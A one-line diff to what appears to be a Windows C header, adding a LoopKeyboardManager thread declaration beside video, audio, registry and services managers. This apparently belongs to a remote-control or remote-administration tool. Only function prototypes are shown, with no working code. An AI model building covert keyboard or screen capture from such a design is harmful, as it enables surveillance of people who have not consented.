@@ -30,3 +30,4 @@ DWORD WINAPI LoopVideoManager(LPVOID lParam);
 DWORD WINAPI LoopAudioManager(LPVOID lParam);
 DWORD WINAPI LoopRegisterManager(LPVOID lParam);
 DWORD WINAPI LoopServicesManager(LPVOID lParam);
+DWORD WINAPI LoopKeyboardManager(LPVOID lParam);
